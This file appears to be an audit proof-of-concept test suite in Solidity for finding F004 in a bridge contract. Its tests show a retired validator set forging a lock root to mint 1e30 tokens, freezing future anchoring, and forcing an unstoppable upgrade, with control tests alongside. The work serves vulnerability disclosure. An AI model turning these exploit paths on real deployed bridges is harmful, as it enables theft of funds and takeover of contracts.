// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

// F004 PoC. Run from the contracts/ copy:  forge test --match-contract F004 -vv
// src/ and test/utils/ are unmodified copies of contracts/ @ 7eb981b
// (git archive). Only this file is added.
//
// Unlike poc/H003 (whose mock verifier accepts a hash commitment the test
// issues), this PoC uses `SigningSetVerifier`: a stand-in that checks the
// three-part statement of ICertificateVerifier against REAL signatures.
//   1. every key in signerBitmap is a member of setRoot
//      (setRoot = keccak over the ordered member list, carried in the proof)
//   2. the signers' weight (1 each, validators.rs:126-137) is > 2/3 of totalWeight
//   3. each signer signed "hypersnap-consensus-vote-v1" || d
// ECDSA (vm.sign) stands in for Falcon-512. It is a *sound* verifier: it
// returns true iff >2/3 of the set committed in setRoot really signed d.
// It ignores `epoch`, exactly as the interface statement does (epoch only
// selects setRoot/totalWeight on the bridge side).

import {BridgeTest} from "./utils/BridgeTest.sol";
import {HypersnapBridgeV3Mock} from "./utils/BridgeV2Test.sol";
import {HypersnapBridgeV2} from "../src/HypersnapBridgeV2.sol";
import {ICertificateVerifier} from "../src/interfaces/ICertificateVerifier.sol";
import {HypersnapProtoEncoder, HeaderFields, RecordFields} from "./utils/HypersnapProtoEncoder.sol";
import {MerkleHelper} from "./utils/MerkleHelper.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract SigningSetVerifier is ICertificateVerifier {
    bytes internal constant VOTE_PREFIX = "hypersnap-consensus-vote-v1";

    function setRootOf(address[] memory members) public pure returns (bytes32) {
        return keccak256(abi.encode("F004_MOCK_SET", members));
    }

    function voteMessage(bytes32 d) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(VOTE_PREFIX, d));
    }

    /// proof = abi.encode(address[] members, bytes[] sigs); sigs are in
    /// bitmap order (one per set bit, ascending member index).
    function verifyCertificate(
        uint64, /* epoch: not part of the signed statement */
        bytes32 setRoot,
        uint64 totalWeight,
        bytes32 payloadDigest,
        bytes calldata signerBitmap,
        bytes calldata proof
    ) external pure returns (bool) {
        (address[] memory members, bytes[] memory sigs) = abi.decode(proof, (address[], bytes[]));
        uint256 n = members.length;
        if (n == 0 || setRootOf(members) != setRoot) return false; // (1) membership
        if (totalWeight != n) return false; // weight 1 per member
        if (signerBitmap.length != (n + 7) / 8) return false; // exact bitmap
        bytes32 m = voteMessage(payloadDigest);
        uint256 k;
        for (uint256 i; i < signerBitmap.length * 8; ++i) {
            bool set_ = (uint8(signerBitmap[i / 8]) >> (i % 8)) & 1 == 1;
            if (!set_) continue;
            if (i >= n) return false; // padding bits must be zero
            if (k >= sigs.length) return false;
            (address r, ECDSA.RecoverError err,) = ECDSA.tryRecover(m, sigs[k]);
            if (err != ECDSA.RecoverError.NoError || r != members[i]) return false; // (3)
            ++k;
        }
        if (k != sigs.length) return false;
        return 3 * k > 2 * uint256(totalWeight); // (2) strict >2/3
    }
}

contract F004RetiredSetTest is BridgeTest {
    uint64 internal constant PIVOT = 25_000_000;
    uint64 internal constant EPOCH_LENGTH = 36_000;
    uint64 internal constant MAX = type(uint64).max;

    SigningSetVerifier internal verifier;
    HypersnapBridgeV2 internal v2Impl;
    HypersnapBridgeV2 internal v2;
    address internal attacker = makeAddr("attacker");

    // set(e) private keys. Disjoint sets: the retired set(1) has no member
    // in the current set(3).
    mapping(uint64 => uint256[]) internal pks;
    mapping(uint64 => address[]) internal members;

    function _mkSet(uint64 epoch, uint256 base, uint256 n) internal {
        for (uint256 i; i < n; ++i) {
            pks[epoch].push(base + i);
            members[epoch].push(vm.addr(base + i));
        }
    }

    function _root(uint64 e) internal view returns (bytes32) {
        return verifier.setRootOf(members[e]);
    }

    function _weight(uint64 e) internal view returns (uint64) {
        return uint64(members[e].length);
    }

    function setUp() public override {
        super.setUp();
        _mkSet(1, 0x1001, 4); // bootstrap set (MIN_VALIDATORS-sized)
        _mkSet(2, 0x2001, 5);
        _mkSet(3, 0x3001, 7);
        _mkSet(4, 0x4001, 7);
        _mkSet(5, 0x5001, 7);
        verifier = new SigningSetVerifier();
        v2Impl = new HypersnapBridgeV2(verifier, _root(1), _weight(1));
        v2 = HypersnapBridgeV2(address(bridge));

        // v1 owner's last upgrade -> V2 (same flow as BridgeV2Test._upgradeToV2).
        uint64 bn = bridge.latestBlock() + 1;
        bridge.proposeUpgrade(bn, address(v2Impl), _signUpgrade(bn, address(v2Impl), OWNER_PK));
        vm.warp(bridge.pendingUpgradeEffectiveAt());
        bridge.executeUpgrade();
        v2.initializeV2(_root(1), _weight(1));

        // Honest bridge life: set(1) -> set(2) -> set(3); honest anchor in epoch 3.
        _handoff(1);
        _handoff(2);
        _anchor(_epochStart(3) + 10, 3, keccak256("honest-root"));
        assertEq(v2.latestEpoch(), 3);
        assertEq(v2.latestHeight(), _epochStart(3) + 10);
    }

    // ---------------------------------------------------------------------
    // helpers
    // ---------------------------------------------------------------------

    function _epochStart(uint64 epoch) internal pure returns (uint64) {
        return PIVOT + (epoch - 1) * EPOCH_LENGTH;
    }

    function _epochOf(uint64 height) internal pure returns (uint64) {
        return 1 + (height - PIVOT) / EPOCH_LENGTH; // node: epoch.rs:30-34
    }

    function _header(uint64 height, uint64 epoch, bytes32 lockRoot)
        internal
        pure
        returns (bytes memory)
    {
        return HypersnapProtoEncoder.encodeHeader(
            HypersnapProtoEncoder.shardZero(height, epoch, lockRoot)
        );
    }

    function _actionHeader(uint64 height, uint64 epoch, bytes32 actionHash)
        internal
        pure
        returns (bytes memory)
    {
        HeaderFields memory f = HypersnapProtoEncoder.shardZero(height, epoch, bytes32(0));
        f.bridgeActionHash = actionHash;
        return HypersnapProtoEncoder.encodeHeader(f);
    }

    /// Certificate where members `signerIdx` of set(setEpoch) really sign
    /// d = certPayloadDigest(0, height, 0, keccak(header)).
    function _certBy(bytes memory header, uint64 height, uint64 setEpoch, uint256[] memory signerIdx)
        internal
        view
        returns (HypersnapBridgeV2.Certificate memory c)
    {
        bytes32 m = verifier.voteMessage(v2.certPayloadDigest(0, height, 0, keccak256(header)));
        bytes memory bitmap = new bytes((members[setEpoch].length + 7) / 8);
        bytes[] memory sigs = new bytes[](signerIdx.length);
        for (uint256 j; j < signerIdx.length; ++j) {
            uint256 i = signerIdx[j]; // must be ascending
            bitmap[i / 8] = bytes1(uint8(bitmap[i / 8]) | uint8(1 << (i % 8)));
            sigs[j] = _sig(pks[setEpoch][i], m);
        }
        c.round = 0;
        c.signerBitmap = bitmap;
        c.proof = abi.encode(members[setEpoch], sigs);
    }

    function _sig(uint256 pk, bytes32 m) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, m);
        return abi.encodePacked(r, s, v);
    }

    function _all(uint64 setEpoch) internal view returns (uint256[] memory idx) {
        idx = new uint256[](members[setEpoch].length);
        for (uint256 i; i < idx.length; ++i) idx[i] = i;
    }

    function _first(uint256 k) internal pure returns (uint256[] memory idx) {
        idx = new uint256[](k);
        for (uint256 i; i < k; ++i) idx[i] = i;
    }

    /// Honest boundary handoff e -> e+1: header at first(e), signed by all of set(e).
    function _handoff(uint64 e) internal {
        uint64 height = _epochStart(e);
        bytes memory rec = HypersnapProtoEncoder.encodeRecord(
            RecordFields({
                epoch: e,
                stateRoot: keccak256(abi.encode("state", height)),
                blockHeight: height,
                nextSetRoot: _root(e + 1),
                nextTotalWeight: _weight(e + 1)
            })
        );
        HeaderFields memory f = HypersnapProtoEncoder.shardZero(height, e, bytes32(0));
        f.epochRecordHash = keccak256(rec);
        bytes memory h = HypersnapProtoEncoder.encodeHeader(f);
        v2.advanceEpoch(h, rec, _certBy(h, height, e, _all(e)));
    }

    function _anchor(uint64 height, uint64 epoch, bytes32 lockRoot) internal {
        bytes memory h = _header(height, epoch, lockRoot);
        v2.advanceRoot(h, _certBy(h, height, epoch, _all(epoch)));
    }

    // ---------------------------------------------------------------------
    // RED: retired set(1) (3 of 4 bootstrap keys) after handoff to epoch 3
    // ---------------------------------------------------------------------

    /// Path 1: a header labelled epoch 1 at an epoch-3 height, signed by 3/4 of
    /// the retired set(1), anchors a forged lock root; claim mints 1e30.
    function test_F004_retiredSet1_anchorsForgedRoot_andMints() public {
        bytes32[] memory leaves = new bytes32[](2);
        leaves[0] = v2.lockLeaf(keccak256("fake-lock"), uint32(block.chainid), attacker, 1e30);
        leaves[1] = v2.lockLeaf(keccak256("fake-lock-2"), uint32(block.chainid), attacker, 1);
        bytes32 fakeRoot = MerkleHelper.root(leaves);

        uint64 height = _epochStart(3) + 11;
        assertEq(_epochOf(height), 3, "height lies in epoch 3 per node rule");
        bytes memory h = _header(height, 1, fakeRoot); // self-declared epoch 1
        v2.advanceRoot(h, _certBy(h, height, 1, _first(3))); // 3 of 4 retired keys
        assertEq(v2.latestLockRoot(), fakeRoot);
        assertEq(v2.latestHeight(), height);

        v2.claim(
            keccak256("fake-lock"), attacker, 1e30, uint32(block.chainid), MerkleHelper.proofFor(leaves, 0)
        );
        assertEq(v2.balanceOf(attacker), 1e30);
        emit log_named_uint("F004 path1: minted to attacker", v2.balanceOf(attacker));
    }

    /// Path 2: retired set(1) pins latestHeight = 2^64-1. The current set(3)
    /// can never anchor again; a later honest handoff no longer anchors.
    function test_F004_retiredSet1_freezesAnchorsForever() public {
        bytes32 fakeRoot = keccak256("attacker-root");
        bytes memory h = _header(MAX, 1, fakeRoot);
        v2.advanceRoot(h, _certBy(h, MAX, 1, _first(3)));
        assertEq(v2.latestHeight(), MAX);

        uint64 honest = _epochStart(3) + 500;
        bytes memory hh = _header(honest, 3, keccak256("honest-root-2"));
        HypersnapBridgeV2.Certificate memory c = _certBy(hh, honest, 3, _all(3));
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridgeV2.StaleHeight.selector, MAX, honest));
        v2.advanceRoot(hh, c);

        _handoff(3); // set(3) -> set(4) still works ...
        assertEq(v2.latestEpoch(), 4);
        assertEq(v2.latestLockRoot(), fakeRoot); // ... but never anchors again
        emit log_named_uint("F004 path2: latestHeight", v2.latestHeight());
    }

    /// Path 3: retired set(1) proposes an evil upgrade at height 2^64-1.
    /// The current set(3) (all 7 keys) can neither pause nor cancel; after
    /// UPGRADE_DELAY anyone executes it.
    function test_F004_retiredSet1_unstoppableUpgrade() public {
        HypersnapBridgeV3Mock evil = new HypersnapBridgeV3Mock(verifier, _root(1), _weight(1));
        bytes memory h =
            _actionHeader(MAX, 1, v2.bridgeActionHash(v2.ACTION_UPGRADE(), 0, address(evil)));
        v2.proposeUpgrade(h, _certBy(h, MAX, 1, _first(3)), 0, address(evil));
        assertEq(v2.lastActionHeight(), MAX);

        uint64 hp = _epochStart(3) + 20;
        bytes memory ph = _actionHeader(hp, 3, v2.bridgeActionHash(v2.ACTION_PAUSE(), 0, address(0)));
        HypersnapBridgeV2.Certificate memory pc = _certBy(ph, hp, 3, _all(3));
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridgeV2.StaleAction.selector, MAX, hp));
        v2.pause(ph, pc, 0);

        bytes memory ch =
            _actionHeader(hp, 3, v2.bridgeActionHash(v2.ACTION_UPGRADE_CANCEL(), 0, address(evil)));
        HypersnapBridgeV2.Certificate memory cc = _certBy(ch, hp, 3, _all(3));
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridgeV2.StaleAction.selector, MAX, hp));
        v2.cancelUpgrade(ch, cc, 0, address(evil));

        vm.warp(v2.pendingUpgradeEffectiveAt());
        v2.executeUpgrade();
        assertEq(HypersnapBridgeV3Mock(address(v2)).version(), 3);
    }

    /// Not bootstrap-specific: after handoffs up to epoch 5, retired set(2)
    /// (4 of 5) anchors a root at an epoch-5 height labelled epoch 2.
    function test_F004_retiredSet2_stillAuthorisesAfterTwoMoreHandoffs() public {
        _handoff(3);
        _handoff(4);
        assertEq(v2.latestEpoch(), 5);
        uint64 height = _epochStart(5) + 1;
        assertEq(_epochOf(height), 5);
        bytes32 fakeRoot = keccak256("set2-forged-root");
        bytes memory h = _header(height, 2, fakeRoot);
        v2.advanceRoot(h, _certBy(h, height, 2, _first(4)));
        assertEq(v2.latestLockRoot(), fakeRoot);
    }

    // ---------------------------------------------------------------------
    // Controls
    // ---------------------------------------------------------------------

    /// The current set(3) anchors normally at an epoch-3 height.
    function test_control_currentSetAnchors() public {
        uint64 height = _epochStart(3) + 100;
        bytes32 root = keccak256("honest-root-next");
        _anchor(height, 3, root);
        assertEq(v2.latestLockRoot(), root);
        assertEq(v2.latestHeight(), height);
    }

    /// Without the attack, the §13.7 defence works: set(3) can pause, and can
    /// cancel a pending upgrade.
    function test_control_currentSetCanPauseAndCancel() public {
        HypersnapBridgeV3Mock impl3 = new HypersnapBridgeV3Mock(verifier, _root(1), _weight(1));
        uint64 h1 = _epochStart(3) + 20;
        bytes memory uh =
            _actionHeader(h1, 3, v2.bridgeActionHash(v2.ACTION_UPGRADE(), 0, address(impl3)));
        v2.proposeUpgrade(uh, _certBy(uh, h1, 3, _all(3)), 0, address(impl3));

        uint64 h2 = h1 + 1;
        bytes memory ch =
            _actionHeader(h2, 3, v2.bridgeActionHash(v2.ACTION_UPGRADE_CANCEL(), 0, address(impl3)));
        v2.cancelUpgrade(ch, _certBy(ch, h2, 3, _all(3)), 0, address(impl3));
        assertEq(v2.pendingImplementation(), address(0));

        uint64 h3 = h2 + 1;
        bytes memory ph = _actionHeader(h3, 3, v2.bridgeActionHash(v2.ACTION_PAUSE(), 0, address(0)));
        v2.pause(ph, _certBy(ph, h3, 3, _all(3)), 0);
        assertGt(v2.pauseExpiry(), block.timestamp);
    }

    /// set(1)'s keys cannot pass as the current set: label epoch 3, signed by
    /// set(1) -> the sound verifier rejects (members not in setRoot[3]).
    function test_control_retiredKeysRejectedUnderCurrentEpochLabel() public {
        uint64 height = _epochStart(3) + 11;
        bytes memory h = _header(height, 3, keccak256("x"));
        HypersnapBridgeV2.Certificate memory c = _certBy(h, height, 1, _all(1));
        vm.expectRevert(HypersnapBridgeV2.BadCertificate.selector);
        v2.advanceRoot(h, c);
    }

    /// Below quorum: 2 of 4 retired keys (3*2 > 2*4 is false) are rejected.
    function test_control_retiredSetBelowQuorumRejected() public {
        uint64 height = _epochStart(3) + 11;
        bytes memory h = _header(height, 1, keccak256("x"));
        HypersnapBridgeV2.Certificate memory c = _certBy(h, height, 1, _first(2));
        vm.expectRevert(HypersnapBridgeV2.BadCertificate.selector);
        v2.advanceRoot(h, c);
    }

    /// Signatures over a different header are rejected (digest binding works).
    function test_control_signaturesForOtherHeaderRejected() public {
        uint64 height = _epochStart(3) + 11;
        bytes memory signed = _header(height, 1, keccak256("signed"));
        bytes memory submitted = _header(height, 1, keccak256("submitted"));
        HypersnapBridgeV2.Certificate memory c = _certBy(signed, height, 1, _first(3));
        vm.expectRevert(HypersnapBridgeV2.BadCertificate.selector);
        v2.advanceRoot(submitted, c);
    }

    /// Retired set at a height <= latestHeight: StaleHeight (the watermark is
    /// the only height check).
    function test_control_retiredSetStaleHeightRejected() public {
        uint64 height = _epochStart(3) + 10; // == latestHeight
        bytes memory h = _header(height, 1, keccak256("x"));
        HypersnapBridgeV2.Certificate memory c = _certBy(h, height, 1, _first(3));
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridgeV2.StaleHeight.selector, height, height));
        v2.advanceRoot(h, c);
    }

    /// An epoch with no stored root is rejected.
    function test_control_unknownEpochRejected() public {
        uint64 height = _epochStart(3) + 11;
        bytes memory h = _header(height, 9, keccak256("x"));
        HypersnapBridgeV2.Certificate memory c = _certBy(h, height, 1, _all(1));
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridgeV2.UnknownEpoch.selector, 9));
        v2.advanceRoot(h, c);
    }

    /// Outsider keys (not in any set) claiming set(1)'s root are rejected.
    function test_control_outsiderKeysRejected() public {
        _mkSet(99, 0x9901, 4);
        uint64 height = _epochStart(3) + 11;
        bytes memory h = _header(height, 1, keccak256("x"));
        HypersnapBridgeV2.Certificate memory c = _certBy(h, height, 99, _all(99));
        vm.expectRevert(HypersnapBridgeV2.BadCertificate.selector);
        v2.advanceRoot(h, c);
    }
}
